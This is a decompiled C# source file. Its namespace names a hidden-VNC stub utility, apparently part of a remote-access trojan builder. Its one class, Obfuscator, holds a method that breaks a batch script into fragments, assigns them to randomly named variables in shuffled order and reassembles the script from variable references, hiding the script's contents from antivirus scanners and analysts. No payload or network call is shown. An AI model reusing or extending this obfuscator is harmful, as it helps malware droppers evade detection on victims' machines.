using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;

namespace BirdBrainmofo.HVNC.StubUtils
{
	// Token: 0x020000AB RID: 171
	public class Obfuscator
	{
		// Token: 0x06000850 RID: 2128 RVA: 0x0005A944 File Offset: 0x00058B44
		public static ValueTuple<string, string> GenCodeBat(string input, Random rng, int level = 5)
		{
			string text = string.Empty;
			string[] array = input.Split(new[] { Environment.NewLine }, StringSplitOptions.None);
			int num = 5;
			if (level > 1)
			{
				num -= level;
			}
			num *= 2;
			List<string> list = new List<string>();
			List<string[]> list2 = new List<string[]>();
			foreach (string text2 in array)
			{
				List<string> list3 = new List<string>();
				string text3 = string.Empty;
				bool flag = false;
				foreach (char c in text2)
				{
					if (c == '%')
					{
						flag = !flag;
						text3 += c.ToString();
					}
					else if (c == ' ' && flag)
					{
						flag = false;
						text3 += c.ToString();
					}
					else
					{
						if (!flag && text3.Length >= num)
						{
							list3.Add(text3);
							flag = false;
							text3 = string.Empty;
						}
						text3 += c.ToString();
					}
				}
				list3.Add(text3);
				List<string> list4 = new List<string>();
				foreach (string text5 in list3)
				{
					string text6 = Utils.RandomString(10, rng);
					list.Add(string.Concat("set \"", text6, "=", text5, "\""));
					list4.Add(text6);
				}
				list2.Add(list4.ToArray());
			}
			list = new List<string>(list.OrderBy(string_0 => rng.Next()));
			for (int k = 0; k < list.Count; k++)
			{
				text += list[k];
				int num2 = rng.Next(0, 2);
				if (num2 != 0 && k != list.Count - 1)
				{
					text += " & ";
				}
				else
				{
					text += Environment.NewLine;
				}
			}
			string text7 = string.Empty;
			foreach (string[] array3 in list2)
			{
				foreach (string text8 in array3)
				{
					text7 = text7 + "%" + text8 + "%";
				}
				text7 += Environment.NewLine;
			}
			return new ValueTuple<string, string>(text.TrimEnd('\r', '\n'), text7.TrimEnd('\r', '\n'));
		}

		// Token: 0x06000851 RID: 2129 RVA: 0x00006F52 File Offset: 0x00005152
		public Obfuscator()
		{
		}

		// Token: 0x020000AC RID: 172
		[CompilerGenerated]
		private sealed class cccc__DisplayClass0_0
		{
			// Token: 0x06000852 RID: 2130 RVA: 0x00006F52 File Offset: 0x00005152
			public cccc__DisplayClass0_0()
			{
			}

			// Token: 0x06000853 RID: 2131 RVA: 0x0000AA2B File Offset: 0x00008C2B
			internal int GenCodeBat_0(string string_0)
			{
				return rng.Next();
			}

			// Token: 0x0400067C RID: 1660
			public Random rng;
		}
	}
}
